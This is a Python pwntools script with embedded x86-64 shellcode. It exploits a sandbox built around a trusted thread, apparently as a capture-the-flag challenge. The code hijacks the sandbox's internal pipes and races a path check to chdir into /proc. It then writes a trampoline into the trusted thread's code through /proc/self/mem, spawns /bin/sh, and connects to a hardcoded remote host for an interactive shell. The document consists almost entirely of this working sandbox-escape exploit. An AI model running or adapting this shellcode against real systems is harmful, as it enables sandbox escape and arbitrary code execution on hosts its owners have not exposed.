from pwn import *
context.update(arch='amd64', os='linux')

shellcode = '''
#define request_syscall 0x4010C0
#define dup2 0x21
#define from_child_to_parent 4
#define parent_to_trusted_r 5
#define trusted_to_sandboxee_r 7
#define new_parent_to_trusted_r 666
#define pipe 0x16
#define pipe_loc 0x00603200
mov r13, request_syscall

/* dup the read end of the parent->trusted pipe, so that writes by the parent
 won't fail */
call clear_regs
mov rdi, dup2
mov rsi, parent_to_trusted_r
mov rdx, new_parent_to_trusted_r
call r13

/* create new pipe */
call clear_regs
mov rdi, pipe
mov rsi, pipe_loc
call r13

/* take over the read end of the parent->trusted pipe */
call clear_regs
mov rdi, dup2
mov rsi, pipe_loc
mov esi, dword ptr [rsi]
mov rdx, parent_to_trusted_r
call r13

/* fill mmap1 with overly long path that overflow back into mmap1 when copied
to mmap2, making the end of the path modifiable by us */
#define path_len (4096-32)/8
#define mmap1_ptr 0x0603158
#define path_str 0x2e2f2e2f2e2f2e2f
mov r12, mmap1_ptr
mov r12, qword ptr [r12]
lea rdi, [r12+16]
mov rcx, path_len
mov rax, path_str
rep stosq

/* setup the syscall params for a chdir in mmap1 */
mov rdx, 0x50   /* chdir */
mov qword ptr [r12], rdx
lea rdx, [r12+16]
lea rcx, [r12+8]
mov qword ptr [rcx], rdx

/* trigger the check for chdir in parent for the '/.'*alot path */
mov rax, 1  /* write */
mov rdi, from_child_to_parent  /* client->parent */
mov rsi, 0x0603160      /* doesn't matter, just need to be readable */
mov rdx, 1  /* 1 byte to write */
syscall

/* wait until parent verifies and copies the arguments by reading on the
parent->trusted pipe */
mov rax, 0
mov rdi, new_parent_to_trusted_r
mov rsi, 0x0603160      /* doesn't matter, just need to be writable */
mov rdx, 1
syscall

/* at this point, parent verified our long /. path and copied it to mmap2,
overflowing back into mmap1 without 0-termination. now we modify the path to
contain /proc at the end and trigger the trusted thread to execute the syscall
with parameters from mmap2, essentially chdir("/././././proc") */
#define proc 0x00636f72702f /* /proc\x00 */
mov rdx, proc
mov qword ptr [r12], rdx

/* trigger trusted and wait for its signal that the chdir is completed */
mov rax, 1  /* write */
lea rsi, [pipe_loc+4]
mov edi, dword ptr [rsi]
mov rdi, 6
mov rsi, 0x0603160      /* doesn't matter, just need to be readable */
mov rdx, 1  /* 1 byte to write */
syscall

mov rax, 0 /* read */
mov rdi, trusted_to_sandboxee_r
mov rsi, 0x0603160      /* doesn't matter, just need to be writable */
mov rdx, 1
syscall

/* at this point, we've chdir'd into /proc, let's open self/mem and escape the
 sandbox */
lea rsi, [r12+56]
mov rbp, 0x6d656d2f666c6573 /* self/mem */
mov qword ptr [rsi], rbp
lea rsi, [rsi+8]
mov qword ptr [rsi], 0x0 /* null-terminate it */

mov rdi, r12 /* mmap1 */
mov qword ptr [rdi], 0x2 /* open */
lea rdi, [rdi+8]
lea rsi, [r12+56]
mov qword ptr [rdi], rsi /* self/mem location */
lea rdi, [rdi+8]
mov qword ptr [rdi], 0x0002 /* O_RDWR */
lea rdi, [rdi+8]
mov qword ptr [rdi], 0x0 /* mode */
call new_request_syscall


/* read out the retval of the open */
#define trusted_syscall_retval 0x0603138
xor r15, r15
mov rdi, trusted_syscall_retval
mov r15d, dword ptr [rdi]

/* where to write in the trusted thread's code */
#define trusted_target 0x0401601

/* seek to trusted_target in /proc/self/mem */
mov rdi, r12 /* mmap1 */
mov qword ptr [rdi], 0x08 /* lseek */
lea rdi, [rdi+8]
mov qword ptr [rdi], r15 /* fd */
lea rdi, [rdi+8]
mov qword ptr [rdi], trusted_target /* offset */
lea rdi, [rdi+8]
mov qword ptr [rdi], 0x0 /* SEEK_SET */
call new_request_syscall

/* get the address of our shellcode */
jmp shellcode_addr
get_shellcode_addr:
    pop r14

/* build the following code:
mov rax, shellcode_addr
jmp rax */
#define trampoline_addr 0x0603300   /* location in .bss */
mov rdi, trampoline_addr
mov word ptr [rdi], 0xb848  /* mov rax, */
lea rdi, [rdi+2]
mov qword ptr [rdi], r14    /* shellcode_addr */
lea rdi, [rdi+8]
mov word ptr [rdi], 0xe0ff    /* jmp rax */

/* overwrite the code of trusted thread with our trampoline */
mov rax, 1  /* write */
mov rdi, r15    /* fd */
mov rsi, trampoline_addr
mov rdx, 0x10  /* 1 byte to write */
syscall

/* trusted is blocked on a read, let it continue onto our trampoline
 after this, trusted should be executing our shellcode from the end of this
 exploit */
mov rax, 1  /* write */
lea rsi, [pipe_loc+4]
mov edi, dword ptr [rsi]
mov rdi, 6
mov rsi, 0x0603160      /* doesn't matter, just need to be readable */
mov rdx, 1  /* 1 byte to write */
syscall

/* do a blocking read here so that we do not crash */
mov rax, 0 /* read */
mov rdi, trusted_to_sandboxee_r
mov rsi, 0x0603160      /* doesn't matter, just need to be writable */
mov rdx, 1
syscall

/* */
new_request_syscall:
    /* trigger the check and copying of syscall params in parent */
    mov rax, 1  /* write */
    mov rdi, from_child_to_parent  /* client->parent */
    mov rsi, 0x0603160      /* doesn't matter, just need to be readable */
    mov rdx, 1  /* 1 byte to write */
    syscall

    /* wait until parent verifies and copies the arguments by reading on the
    parent->trusted pipe */
    mov rax, 0
    mov rdi, new_parent_to_trusted_r
    mov rsi, 0x0603160      /* doesn't matter, just need to be writable */
    mov rdx, 1
    syscall

    /* trigger trusted to execute the syscall */
    mov rax, 1  /* write */
    lea rsi, [pipe_loc+4]
    mov edi, dword ptr [rsi]
    mov rdi, 6
    mov rsi, 0x0603160      /* doesn't matter, just need to be readable */
    mov rdx, 1  /* 1 byte to write */
    syscall

    mov rax, 0 /* read */
    mov rdi, trusted_to_sandboxee_r
    mov rsi, 0x0603160      /* doesn't matter, just need to be writable */
    mov rdx, 1
    syscall

    ret

clear_regs:
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rcx, rcx
    xor r8, r8
    xor r9, r9
    ret

shellcode_addr:
    call get_shellcode_addr
shellcode:
    mov     rsp, 0x0603400
    xor     rax, rax
    xor     rdx, rdx
    mov     rbx, 0x68732f6e69622f2f
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     al, 0x3b
    syscall
'''

# r = remote('127.0.0.1', 4444)

r = remote('136.243.194.42', 1024)
print r.sendafter('):', asm(shellcode)+ '\x90' * 8)
r.interactive()

# sys.stdout.write(asm(shellcode) + '\x90' * 8)
# print disasm(asm(shellcode))